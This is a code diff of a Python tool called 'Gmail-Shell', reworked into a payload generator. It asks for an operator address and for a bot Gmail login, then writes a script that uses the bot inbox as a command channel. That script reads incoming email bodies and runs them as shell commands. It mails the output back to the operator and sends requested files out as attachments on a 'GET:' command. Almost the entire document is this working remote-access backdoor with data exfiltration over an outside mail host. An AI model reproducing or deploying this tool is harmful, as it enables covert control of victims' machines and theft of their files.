@@ -1,11 +1,19 @@
-#!/bin/env python
-
 '''
- Simple gmail Shell written in python3 by @Riadh Benlamine.
- __version__ = 1.1
+    Gmail shell, This payload generator
+    Author = Riadh Benlamine
+    Version = 2
 '''
+import getpass
 
-import imaplib
+print('\t\tGmail-Shell 2v')
+print('paylaod generator')
+reverse_email = input('Enter your gmail:')
+bot_email = input('bot gmail:')
+bot_password = getpass.getpass('bot\'s gmail password:')
+payload_name = input('File name [test.py]:')
+print('Gerenating your payload...')
+
+payload = '''import imaplib
 import smtplib
 import email
 import subprocess
@@ -14,18 +22,18 @@ import multiprocessing
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
-from email import encoders
-
-EMAIL_ADD = '' # Gmail of this payload
-PASSWORD = '' # Password of this Gmail
-EMAIL_TO = [''] # Gmails to send the output
-
-
+from email import encoders\n
+'''
+payload += f'''
+b_e = \'{bot_email}\'
+b_p = \'{bot_password}\'
+r_e = \'{reverse_email}\'
+'''
+payload += '''
 def mail():
-    ''' recive mails and return them '''
     try:
         mail = imaplib.IMAP4_SSL('imap.gmail.com')
-        mail.login(EMAIL_ADD, PASSWORD)
+        mail.login(b_e, b_p)
         mail.select('inbox')
         result, data = mail.uid('search', None, 'UnSeen')
         latest_email_uid = data[0].split()[-1]
@@ -42,20 +50,17 @@ def mail():
         return body.decode()
     except:
         return 0
-
+'''
+payload += '''
 def send(data=None, path=None):
-    ''' send email with this prams
-    data: any str
-    path: any file path
-    '''
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        server.login(EMAIL_ADD, PASSWORD)
+        server.login(b_e, b_p)
         if path is not None:
             msg = MIMEMultipart()
-            msg['From'] = EMAIL_ADD
-            msg['To'] = ','.join(EMAIL_TO)
+            msg['From'] = b_e
+            msg['To'] = ','.join(r_e)
             msg['Subject'] = "Gmail-Shell Output"
             body = 'You requested file'
             msg.attach(MIMEText(body, 'plain'))
@@ -67,29 +72,32 @@ def send(data=None, path=None):
             base.add_header('Content-Disposition', f"attachment; filename= {file_name}")
             msg.attach(base)
             text = msg.as_string()
-            server.sendmail(EMAIL_ADD, EMAIL_TO, text)
+            server.sendmail(b_e, r_e, text)
         if data:
-            server.sendmail(EMAIL_ADD, EMAIL_TO, str(data).encode())
+            server.sendmail(b_e, r_e, str(data).encode())
     except:
         pass
-
+'''
+payload += '''
 def analyzer(command):
-    ''' command should be str to check if there is one of methods '''
     if 'GET:' in command:
         file_path = command.replace("GET:", '')
         send(path=file_path)
     else:
         pass
+'''
 
+payload += '''
+def run(command):
+    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0].decode()
 
 def main():
-    ''' Main program '''
     command = mail()
     if isinstance(command, str):
         try:
-            command = command.replace('\r', '').replace('\n', '')
+            command = command.replace('\\r', '').replace('\\n', '')
             analyzer(command)
-            command_output = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
+            command_output = run(command)
             text = f"Output: {command_output}"
             payload = base64.b64encode(text.encode())
             send(data=payload)
@@ -97,7 +105,12 @@ def main():
             pass
     else:
         pass
-
+'''
+payload += '''
 if __name__ == '__main__':
-    proc_one = multiprocessing.Process(target=main)
-    proc_one.start()
+    proc = multiprocessing.Process(target=main)
+    proc.start()
+'''
+with open(payload_name, 'w') as pay:
+    pay.write(payload)
+print('Done.')
